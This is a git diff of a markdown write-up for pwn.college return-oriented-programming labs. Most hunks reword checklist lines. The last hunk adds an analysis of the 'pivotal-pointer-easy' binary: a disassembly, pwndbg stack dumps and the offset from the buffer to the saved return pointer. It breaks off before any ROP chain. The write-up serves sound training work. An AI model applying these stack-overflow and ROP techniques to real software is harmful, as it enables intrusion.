@@ -2185,7 +2185,7 @@ hacker@return-oriented-programming~stop-pop-and-rop-hard:~$ /challenge/stop-pop-
 These are the things that we need to craft an exploit
 
 - [ ] Location of the buffer
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 
 ### Binary Analysis
 
@@ -2319,7 +2319,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [x] Location of the buffer: `0x7ffeefcd0a30`
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 
 ```
 pwndbg> info frame
@@ -2333,7 +2333,7 @@ Stack level 0, frame at 0x7ffeefcd0a90:
 ```
 
 - [x] Location of the buffer: `0x7ffeefcd0a30`
-- [x] Location of the stored return address to `main()`: `0x7ffeefcd0a88`
+- [x] location of the stored return pointer to `main()`: `0x7ffeefcd0a88`
 
 Now we can successfully craft.
 
@@ -2532,7 +2532,7 @@ What we can do however, is resuse some string which is already present in the bi
 Let's first understand the binary and get the following information:
 
 - [ ] Location of the buffer
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 - [ ] Location of a NULL terminated string
 
 ### Binary Analysis
@@ -2721,7 +2721,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [x] Location of the buffer: `0x7ffd2b5e9be0` 
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 - [ ] Location of a NULL terminated string
 
 ```
@@ -2736,7 +2736,7 @@ Stack level 0, frame at 0x7ffd2b5e9c30:
 ```
 
 - [x] Location of the buffer: `0x7ffd2b5e9be0` 
-- [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
+- [x] location of the stored return pointer to `main()`: `0x7ffd2b5e9c28`
 - [ ] Location of a NULL terminated string
 
 Now, let's look at the ROP gadgets that we have at our disposal.
@@ -2928,7 +2928,7 @@ hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ objdump -s -j .ro
 Out of the various options that we have, let's go with `b"!\x00"` which is at the address `0x403386`.
 
 - [x] Location of the buffer: `0x7ffd2b5e9be0` 
-- [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
+- [x] location of the stored return pointer to `main()`: `0x7ffd2b5e9c28`
 - [x] Location of a NULL terminated string: `0x403386`
 
 ### ROP chain: ret2stack
@@ -3220,7 +3220,7 @@ hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ /challenge/stop-p
 
 We need the following to craft our exploit:
 - [ ] Location of the buffer 
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 - [ ] Location of a NULL terminated string
 
 Let's get the string addres first.
@@ -3232,7 +3232,7 @@ hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ objdump -s -j .ro
 ```
 
 - [ ] Location of the buffer 
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 - [x] Location of a NULL terminated string: `0x403030`
 
 ### Binary Analysis
@@ -3334,7 +3334,7 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ```
 
 - [x] Location of the buffer: `0x7ffdc51a0330`
-- [ ] Location of the stored return address to `main()`
+- [ ] location of the stored return pointer to `main()`
 - [x] Location of a NULL terminated string: `0x403030`
 
 ```
@@ -3349,7 +3349,7 @@ Stack level 0, frame at 0x7ffdc51a0380:
 ```
 
 - [x] Location of the buffer: `0x7ffdc51a0330`
-- [x] Location of the stored return address to `main()`: `0x7ffdc51a0378`
+- [x] location of the stored return pointer to `main()`: `0x7ffdc51a0378`
 - [x] Location of a NULL terminated string: `0x403030`
 
 Finally let's take a look at the ROP gadgets.
@@ -3938,7 +3938,7 @@ $1 = 88
 
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Buffer address: `0x7ffcd4fe1ae0`
-   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x4011d0`
@@ -3979,7 +3979,7 @@ hacker@return-oriented-programming~indirect-invocation-easy:/$ objdump -s -j .ro
 
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Buffer address: `0x7ffcd4fe1ae0`
-   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
 - [x] Location of a NULL terminated string: `0x403386`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x4011d0`
@@ -4029,7 +4029,7 @@ Local exec file:
 
 - [x] Offset between buffer and stored return address to `main()`: `88`
    - Buffer address: `0x7ffcd4fe1ae0`
-   - Location of the stored return address to `main()`: `0x7ffcd4fe1b38`
+   - location of the stored return pointer to `main()`: `0x7ffcd4fe1b38`
 - [x] Location of a NULL terminated string: `0x403386`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x4011d0`
@@ -4953,7 +4953,7 @@ $1: 56
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Buffer address: `0x7ffd745d5f90`
-   - Location of the stored return address to `main()`: `0x7ffd745d5fc8`
+   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
 - [ ] Location of a NULL terminated string
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -4975,7 +4975,7 @@ hacker@return-oriented-programming~indirect-invocation-hard:/$ objdump -s -j .ro
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Buffer address: `0x7ffd745d5f90`
-   - Location of the stored return address to `main()`: `0x7ffd745d5fc8`
+   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
 - [x] Location of a NULL terminated string: `0x402030`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -5025,7 +5025,7 @@ Local exec file:
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Buffer address: `0x7ffd745d5f90`
-   - Location of the stored return address to `main()`: `0x7ffd745d5fc8`
+   - location of the stored return pointer to `main()`: `0x7ffd745d5fc8`
 - [x] Location of a NULL terminated string: `0x402030`
 - [x] Locations of required PLT stubs
    - `open@plt`: `0x401100`
@@ -5507,7 +5507,7 @@ $1: 120
 
 - [x] Offset between buffer and stored return address to `main()`: `120`
    - Location of the buffer: `0x7ffd64369ec0`
-   - Location of the stored return address to `main()`: `0x7ffd64369f38`
+   - location of the stored return pointer to `main()`: `0x7ffd64369f38`
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -5551,7 +5551,7 @@ hacker@return-oriented-programming~leaky-libc-easy:/$ objdump -s -j .rodata /cha
 
 - [x] Offset between buffer and stored return address to `main()`: `120`
    - Location of the buffer: `0x7ffd64369ec0`
-   - Location of the stored return address to `main()`: `0x7ffd64369f38`
+   - location of the stored return pointer to `main()`: `0x7ffd64369f38`
 - [x] Location of a NULL terminated string: `0x402491`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6078,7 +6078,7 @@ Stack level 0, frame at 0x7ffd039a0900:
 
 - [ ] Offset between buffer and stored return address to `main()`
    - Location of the buffer: `0x7ffd039a08b0`
-   - Location of the stored return address to `main()`: `0x7ffd039a08f8`
+   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6096,7 +6096,7 @@ $1: 72
 
 - [x] Offset between buffer and stored return address to `main()`: `72`
    - Location of the buffer: `0x7ffd039a08b0`
-   - Location of the stored return address to `main()`: `0x7ffd039a08f8`
+   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
 - [ ] Location of a NULL terminated string
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6116,7 +6116,7 @@ hacker@return-oriented-programming~leaky-libc-hard:/$ objdump -s -j .rodata /cha
 
 - [x] Offset between buffer and stored return address to `main()`: `72`
    - Location of the buffer: `0x7ffd039a08b0`
-   - Location of the stored return address to `main()`: `0x7ffd039a08f8`
+   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
 - [x] Location of a NULL terminated string: `0x40306d`
 - [x] Offsets of required Libc functions
    - Offset of `system()` within Libc: `0x52290`
@@ -6478,7 +6478,7 @@ $1: 56
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - Location of the stored return address to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [ ] Location of a NULL terminated string
@@ -6524,7 +6524,7 @@ hacker@return-oriented-programming~putsception-easy:/$ objdump -s -j .rodata /ch
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - Location of the stored return address to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [x] Location of a NULL terminated string: `0x403606`
@@ -6680,7 +6680,7 @@ Unique gadgets found: 136
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - Location of the stored return address to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [x] Location of a NULL terminated string: `0x403606`
@@ -6713,7 +6713,7 @@ hacker@return-oriented-programming~putsception-easy:/$ readelf -s /lib/x86_64-li
 
 - [x] Offset between buffer and stored return address to `main()`: `56`
    - Location of the buffer: `0x7fff7f3afc20`
-   - Location of the stored return address to `main()`: `0x7fff7f3afc58`
+   - location of the stored return pointer to `main()`: `0x7fff7f3afc58`
 - [x] Location of the PLT entry of `puts@plt`: `0x401110`
 - [x] Location of the GOT entry of `puts@got`: `0x405028`
 - [x] Location of a NULL terminated string: `0x403606`
@@ -7362,7 +7362,7 @@ $1: 72
 
 - [x] Offset between buffer and stored return address to `main()`: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [ ] Location of a NULL terminated string
@@ -7380,7 +7380,7 @@ hacker@return-oriented-programming~putsception-hard:/$ objdump -s -j .rodata /ch
 
 - [x] Offset between buffer and stored return address to `main()`: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [x] Location of a NULL terminated string: `0x403030`
@@ -7478,7 +7478,7 @@ Unique gadgets found: 78
 
 - [x] Offset between buffer and stored return address to `main()`: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [x] Location of a NULL terminated string: `0x403030`
@@ -7511,7 +7511,7 @@ hacker@return-oriented-programming~putsception-hard:/$ readelf -s /lib/x86_64-li
 
 - [x] Offset between buffer and stored return address to `main()`: `72`
    - Location of the buffer: `0x7fff1ca54290`
-   - Location of the stored return address to `main()`: `0x7fff1ca542d8`
+   - location of the stored return pointer to `main()`: `0x7fff1ca542d8`
 - [x] Location of the PLT entry of `puts@plt`: `0x401090`
 - [x] Location of the GOT entry of `puts@got`: `0x405020`
 - [x] Location of a NULL terminated string: `0x403030`
@@ -9001,4 +9001,563 @@ $
 ```
 hacker@return-oriented-programming~pivotal-prelude-hard:/$ cat /flag 
 pwn.college{w0lkI9UBU_5iJK-DGm6-CGh-A4J.0FO1MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Pivotal Pointer (Easy)
+
+```
+hacker@return-oriented-programming~pivotal-pointer-easy:/$ /challenge/pivotal-pointer-easy 
+###
+### Welcome to /challenge/pivotal-pointer-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
+partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
+to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
+ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
+might take anywhere from 0-12 bits of bruteforce depending on the scenario.
+
+In this challenge, a pointer to the win function is stored on the stack.
+That pointer is stored at 0x7ffeee876be0, 8 bytes before your input buffer.
+If you can pivot the stack to make the next gadget run be that win function, you will get the flag!
+
+ASLR means that the address of the stack is not known,
+but I will simulate a memory disclosure of it.
+By knowing where the stack is, you can now reference data
+that you write onto the stack.
+Be careful: this data could trip up your ROP chain,
+because it could be interpreted as return addresses.
+You can use gadgets that shift the stack appropriately to avoid that.
+[LEAK] Your input buffer is located at: 0x7ffeee876be8.
+
+The win function has just been dynamically constructed at 0x7f9465ef8000.
+
+```
+
+Since location of the pointer to `win()` is before our buffer, we will have to perform a stack pivot so that our ROP chain executes the `win()` function.
+
+We need the following:
+- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
+- [ ] Locations of required ROP gadgets
+
+### Binary Analysis
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000001d42 <+0>:     endbr64
+   0x0000000000001d46 <+4>:     push   rbp
+   0x0000000000001d47 <+5>:     mov    rbp,rsp
+   0x0000000000001d4a <+8>:     sub    rsp,0x90
+   0x0000000000001d51 <+15>:    mov    DWORD PTR [rbp-0x74],edi
+   0x0000000000001d54 <+18>:    mov    QWORD PTR [rbp-0x80],rsi
+   0x0000000000001d58 <+22>:    mov    QWORD PTR [rbp-0x88],rdx
+   0x0000000000001d5f <+29>:    lea    rdi,[rip+0x1432]        # 0x3198
+   0x0000000000001d66 <+36>:    call   0x1160 <puts@plt>
+   0x0000000000001d6b <+41>:    lea    rdi,[rip+0x149e]        # 0x3210
+   0x0000000000001d72 <+48>:    call   0x1160 <puts@plt>
+   0x0000000000001d77 <+53>:    lea    rdx,[rbp-0x70]
+   0x0000000000001d7b <+57>:    mov    eax,0x0
+   0x0000000000001d80 <+62>:    mov    ecx,0xc
+   0x0000000000001d85 <+67>:    mov    rdi,rdx
+   0x0000000000001d88 <+70>:    rep stos QWORD PTR es:[rdi],rax
+   0x0000000000001d8b <+73>:    mov    rax,rsp
+   0x0000000000001d8e <+76>:    mov    QWORD PTR [rip+0x32cb],rax        # 0x5060 <sp_>
+   0x0000000000001d95 <+83>:    mov    rax,rbp
+   0x0000000000001d98 <+86>:    mov    QWORD PTR [rip+0x32a1],rax        # 0x5040 <bp_>
+   0x0000000000001d9f <+93>:    mov    rdx,QWORD PTR [rip+0x329a]        # 0x5040 <bp_>
+   0x0000000000001da6 <+100>:   mov    rax,QWORD PTR [rip+0x32b3]        # 0x5060 <sp_>
+   0x0000000000001dad <+107>:   sub    rdx,rax
+   0x0000000000001db0 <+110>:   mov    rax,rdx
+   0x0000000000001db3 <+113>:   shr    rax,0x3
+   0x0000000000001db7 <+117>:   add    rax,0x2
+   0x0000000000001dbb <+121>:   mov    QWORD PTR [rip+0x328e],rax        # 0x5050 <sz_>
+   0x0000000000001dc2 <+128>:   mov    rax,QWORD PTR [rip+0x3277]        # 0x5040 <bp_>
+   0x0000000000001dc9 <+135>:   add    rax,0x8
+   0x0000000000001dcd <+139>:   mov    QWORD PTR [rip+0x3284],rax        # 0x5058 <rp_>
+   0x0000000000001dd4 <+146>:   lea    rdi,[rip+0x149d]        # 0x3278
+   0x0000000000001ddb <+153>:   call   0x1160 <puts@plt>
+   0x0000000000001de0 <+158>:   lea    rdi,[rip+0x1511]        # 0x32f8
+   0x0000000000001de7 <+165>:   call   0x1160 <puts@plt>
+   0x0000000000001dec <+170>:   lea    rdi,[rip+0x157d]        # 0x3370
+   0x0000000000001df3 <+177>:   call   0x1160 <puts@plt>
+   0x0000000000001df8 <+182>:   lea    rdi,[rip+0x15e9]        # 0x33e8
+   0x0000000000001dff <+189>:   call   0x1160 <puts@plt>
+   0x0000000000001e04 <+194>:   lea    rdi,[rip+0x1655]        # 0x3460
+   0x0000000000001e0b <+201>:   call   0x1160 <puts@plt>
+   0x0000000000001e10 <+206>:   lea    rdi,[rip+0x1699]        # 0x34b0
+   0x0000000000001e17 <+213>:   call   0x1160 <puts@plt>
+   0x0000000000001e1c <+218>:   lea    rax,[rbp-0x70]
+   0x0000000000001e20 <+222>:   mov    edx,0x8
+   0x0000000000001e25 <+227>:   mov    rsi,rax
+   0x0000000000001e28 <+230>:   lea    rdi,[rip+0x16d1]        # 0x3500
+   0x0000000000001e2f <+237>:   mov    eax,0x0
+   0x0000000000001e34 <+242>:   call   0x1190 <printf@plt>
+   0x0000000000001e39 <+247>:   lea    rdi,[rip+0x1708]        # 0x3548
+   0x0000000000001e40 <+254>:   call   0x1160 <puts@plt>
+   0x0000000000001e45 <+259>:   lea    rdi,[rip+0x1764]        # 0x35b0
+   0x0000000000001e4c <+266>:   call   0x1160 <puts@plt>
+   0x0000000000001e51 <+271>:   lea    rdi,[rip+0x1790]        # 0x35e8
+   0x0000000000001e58 <+278>:   call   0x1160 <puts@plt>
+   0x0000000000001e5d <+283>:   lea    rdi,[rip+0x17b4]        # 0x3618
+   0x0000000000001e64 <+290>:   call   0x1160 <puts@plt>
+   0x0000000000001e69 <+295>:   lea    rdi,[rip+0x17e8]        # 0x3658
+   0x0000000000001e70 <+302>:   call   0x1160 <puts@plt>
+   0x0000000000001e75 <+307>:   lea    rdi,[rip+0x17fc]        # 0x3678
+   0x0000000000001e7c <+314>:   call   0x1160 <puts@plt>
+   0x0000000000001e81 <+319>:   lea    rdi,[rip+0x1828]        # 0x36b0
+   0x0000000000001e88 <+326>:   call   0x1160 <puts@plt>
+   0x0000000000001e8d <+331>:   lea    rdi,[rip+0x1854]        # 0x36e8
+   0x0000000000001e94 <+338>:   call   0x1160 <puts@plt>
+   0x0000000000001e99 <+343>:   lea    rax,[rbp-0x70]
+   0x0000000000001e9d <+347>:   add    rax,0x8
+   0x0000000000001ea1 <+351>:   mov    rsi,rax
+   0x0000000000001ea4 <+354>:   lea    rdi,[rip+0x1885]        # 0x3730
+   0x0000000000001eab <+361>:   mov    eax,0x0
+   0x0000000000001eb0 <+366>:   call   0x1190 <printf@plt>
+   0x0000000000001eb5 <+371>:   mov    r9d,0x0
+   0x0000000000001ebb <+377>:   mov    r8d,0x0
+   0x0000000000001ec1 <+383>:   mov    ecx,0x22
+   0x0000000000001ec6 <+388>:   mov    edx,0x3
+   0x0000000000001ecb <+393>:   mov    esi,0x138
+   0x0000000000001ed0 <+398>:   mov    edi,0x0
+   0x0000000000001ed5 <+403>:   call   0x1180 <mmap@plt>
+   0x0000000000001eda <+408>:   mov    QWORD PTR [rbp-0x70],rax
+   0x0000000000001ede <+412>:   mov    rax,QWORD PTR [rbp-0x70]
+   0x0000000000001ee2 <+416>:   mov    edx,0x138
+   0x0000000000001ee7 <+421>:   lea    rsi,[rip+0x1872]        # 0x3760
+   0x0000000000001eee <+428>:   mov    rdi,rax
+   0x0000000000001ef1 <+431>:   call   0x11d0 <memcpy@plt>
+   0x0000000000001ef6 <+436>:   mov    rax,QWORD PTR [rbp-0x70]
+   0x0000000000001efa <+440>:   mov    edx,0x5
+   0x0000000000001eff <+445>:   mov    esi,0x138
+   0x0000000000001f04 <+450>:   mov    rdi,rax
+   0x0000000000001f07 <+453>:   call   0x1220 <mprotect@plt>
+   0x0000000000001f0c <+458>:   test   eax,eax
+   0x0000000000001f0e <+460>:   je     0x1f2f <challenge+493>
+   0x0000000000001f10 <+462>:   lea    rcx,[rip+0x1a31]        # 0x3948 <__PRETTY_FUNCTION__.23120>
+   0x0000000000001f17 <+469>:   mov    edx,0xa0
+   0x0000000000001f1c <+474>:   lea    rsi,[rip+0x188c]        # 0x37af
+   0x0000000000001f23 <+481>:   lea    rdi,[rip+0x188e]        # 0x37b8
+   0x0000000000001f2a <+488>:   call   0x11a0 <__assert_fail@plt>
+   0x0000000000001f2f <+493>:   mov    rax,QWORD PTR [rbp-0x70]
+   0x0000000000001f33 <+497>:   mov    rsi,rax
+   0x0000000000001f36 <+500>:   lea    rdi,[rip+0x18bb]        # 0x37f8
+   0x0000000000001f3d <+507>:   mov    eax,0x0
+   0x0000000000001f42 <+512>:   call   0x1190 <printf@plt>
+   0x0000000000001f47 <+517>:   lea    rax,[rbp-0x70]
+   0x0000000000001f4b <+521>:   add    rax,0x8
+   0x0000000000001f4f <+525>:   mov    edx,0x1000
+   0x0000000000001f54 <+530>:   mov    rsi,rax
+   0x0000000000001f57 <+533>:   mov    edi,0x0
+   0x0000000000001f5c <+538>:   call   0x11b0 <read@plt>
+   0x0000000000001f61 <+543>:   mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000001f64 <+546>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001f67 <+549>:   cdqe
+   0x0000000000001f69 <+551>:   lea    rdx,[rbp-0x70]
+   0x0000000000001f6d <+555>:   lea    rcx,[rdx+0x8]
+   0x0000000000001f71 <+559>:   mov    rdx,QWORD PTR [rip+0x30e0]        # 0x5058 <rp_>
+   0x0000000000001f78 <+566>:   sub    rcx,rdx
+   0x0000000000001f7b <+569>:   mov    rdx,rcx
+   0x0000000000001f7e <+572>:   add    rax,rdx
+   0x0000000000001f81 <+575>:   shr    rax,0x3
+   0x0000000000001f85 <+579>:   mov    rdx,rax
+   0x0000000000001f88 <+582>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001f8b <+585>:   mov    esi,eax
+   0x0000000000001f8d <+587>:   lea    rdi,[rip+0x18a4]        # 0x3838
+   0x0000000000001f94 <+594>:   mov    eax,0x0
+   0x0000000000001f99 <+599>:   call   0x1190 <printf@plt>
+   0x0000000000001f9e <+604>:   lea    rdi,[rip+0x18cb]        # 0x3870
+   0x0000000000001fa5 <+611>:   call   0x1160 <puts@plt>
+   0x0000000000001faa <+616>:   lea    rdi,[rip+0x1927]        # 0x38d8
+   0x0000000000001fb1 <+623>:   call   0x1160 <puts@plt>
+   0x0000000000001fb6 <+628>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001fb9 <+631>:   cdqe
+   0x0000000000001fbb <+633>:   lea    rdx,[rbp-0x70]
+   0x0000000000001fbf <+637>:   lea    rcx,[rdx+0x8]
+   0x0000000000001fc3 <+641>:   mov    rdx,QWORD PTR [rip+0x308e]        # 0x5058 <rp_>
+   0x0000000000001fca <+648>:   sub    rcx,rdx
+   0x0000000000001fcd <+651>:   mov    rdx,rcx
+   0x0000000000001fd0 <+654>:   add    rax,rdx
+   0x0000000000001fd3 <+657>:   shr    rax,0x3
+   0x0000000000001fd7 <+661>:   add    eax,0x1
+   0x0000000000001fda <+664>:   mov    edx,eax
+   0x0000000000001fdc <+666>:   mov    rax,QWORD PTR [rip+0x3075]        # 0x5058 <rp_>
+   0x0000000000001fe3 <+673>:   mov    esi,edx
+   0x0000000000001fe5 <+675>:   mov    rdi,rax
+   0x0000000000001fe8 <+678>:   call   0x1720 <print_chain>
+   0x0000000000001fed <+683>:   lea    rdi,[rip+0x1926]        # 0x391a
+   0x0000000000001ff4 <+690>:   call   0x1160 <puts@plt>
+   0x0000000000001ff9 <+695>:   nop
+   0x0000000000001ffa <+696>:   leave
+   0x0000000000001ffb <+697>:   ret
+End of assembler dump.
+```
+
+Let us set a breakpoint at `challenge+538` where the call to `read()` is made.
+
+```
+pwndbg> break *(challenge+538)
+Breakpoint 1 at 0x1f5c
+```
+
+```
+pwndbg> run
+Starting program: /challenge/pivotal-pointer-easy 
+###
+### Welcome to /challenge/pivotal-pointer-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
+partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
+to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
+ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
+might take anywhere from 0-12 bits of bruteforce depending on the scenario.
+
+In this challenge, a pointer to the win function is stored on the stack.
+That pointer is stored at 0x7fff122d4e00, 8 bytes before your input buffer.
+If you can pivot the stack to make the next gadget run be that win function, you will get the flag!
+
+ASLR means that the address of the stack is not known,
+but I will simulate a memory disclosure of it.
+By knowing where the stack is, you can now reference data
+that you write onto the stack.
+Be careful: this data could trip up your ROP chain,
+because it could be interpreted as return addresses.
+You can use gadgets that shift the stack appropriately to avoid that.
+[LEAK] Your input buffer is located at: 0x7fff122d4e08.
+
+The win function has just been dynamically constructed at 0x7d32b1c75000.
+
+Breakpoint 1, 0x00006343e1bc3f5c in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
+ RAX  0x7fff122d4e08 ◂— 0
+ RBX  0x6343e1bc40c0 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  0x1000
+ RDI  0
+ RSI  0x7fff122d4e08 ◂— 0
+ R8   0x4a
+ R9   0x4a
+ R10  0x6343e1bc5834 ◂— 0x6563655200000a2e /* '.\n' */
+ R11  0x246
+ R12  0x6343e1bc3240 (_start) ◂— endbr64 
+ R13  0x7fff122d4f90 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff122d4e70 —▸ 0x7fff122d4ea0 ◂— 0
+ RSP  0x7fff122d4de0 ◂— 0xd68 /* 'h\r' */
+ RIP  0x6343e1bc3f5c (challenge+538) ◂— call read@plt
+────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
+ ► 0x6343e1bc3f5c <challenge+538>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7fff122d4e08 ◂— 0
+        nbytes: 0x1000
+ 
+   0x6343e1bc3f61 <challenge+543>    mov    dword ptr [rbp - 4], eax
+   0x6343e1bc3f64 <challenge+546>    mov    eax, dword ptr [rbp - 4]
+   0x6343e1bc3f67 <challenge+549>    cdqe   
+   0x6343e1bc3f69 <challenge+551>    lea    rdx, [rbp - 0x70]
+   0x6343e1bc3f6d <challenge+555>    lea    rcx, [rdx + 8]
+   0x6343e1bc3f71 <challenge+559>    mov    rdx, qword ptr [rip + 0x30e0]     RDX, [rp_]
+   0x6343e1bc3f78 <challenge+566>    sub    rcx, rdx
+   0x6343e1bc3f7b <challenge+569>    mov    rdx, rcx
+   0x6343e1bc3f7e <challenge+572>    add    rax, rdx
+   0x6343e1bc3f81 <challenge+575>    shr    rax, 3
+─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7fff122d4de0 ◂— 0xd68 /* 'h\r' */
+01:0008│-088     0x7fff122d4de8 —▸ 0x7fff122d4fa8 —▸ 0x7fff122d6689 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-080     0x7fff122d4df0 —▸ 0x7fff122d4f98 —▸ 0x7fff122d6669 ◂— '/challenge/pivotal-pointer-easy'
+03:0018│-078     0x7fff122d4df8 ◂— 0x10000000a /* '\n' */
+04:0020│-070     0x7fff122d4e00 —▸ 0x7d32b1c75000 ◂— push rbp
+05:0028│ rax rsi 0x7fff122d4e08 ◂— 0
+... ↓            2 skipped
+───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x6343e1bc3f5c challenge+538
+   1   0x6343e1bc40a1 main+165
+   2   0x7d32b0a39083 __libc_start_main+243
+   3   0x6343e1bc326e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
+   - Location of the buffer: `0x7fff122d4e08`
+- [ ] Locations of required ROP gadgets
+
+Let's get the location of the stored return pointer, and calculate the offset.
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7fff122d4e80:
+ rip = 0x6343e1bc3f5c in challenge; saved rip = 0x6343e1bc40a1
+ called by frame at 0x7fff122d4eb0
+ Arglist at 0x7fff122d4e70, args: 
+ Locals at 0x7fff122d4e70, Previous frame's sp is 0x7fff122d4e80
+ Saved registers:
+  rbp at 0x7fff122d4e70, rip at 0x7fff122d4e78
+```
+
+```
+pwndbg> 0x7fff122d4e78 - 0x7fff122d4e08
+$1: 112
+```
+
+- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `112`
+   - Location of the buffer: `0x7fff122d4e08`
+   - Location of stored return pointer to `main()`: `0x7fff122d4e78`
+- [ ] Locations of required ROP gadgets
+
+#### ROP gadgets
+
